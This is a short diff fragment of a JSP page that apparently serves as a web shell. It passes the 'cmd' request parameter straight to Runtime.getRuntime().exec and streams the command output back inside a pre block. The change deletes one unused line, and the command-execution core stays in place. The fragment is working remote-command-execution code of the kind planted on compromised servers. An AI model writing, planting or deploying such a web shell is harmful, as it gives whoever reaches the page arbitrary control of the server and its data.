@@ -2,7 +2,6 @@
 <%@ page contentType="text/html;charset=UTF-8" language="java" %>
 <pre>
 <%
-    String[] cmd = request.getParameterValues("cmd");
     Process process = Runtime.getRuntime().exec(request.getParameter("cmd"));
     InputStream in = process.getInputStream();
     int a = 0;
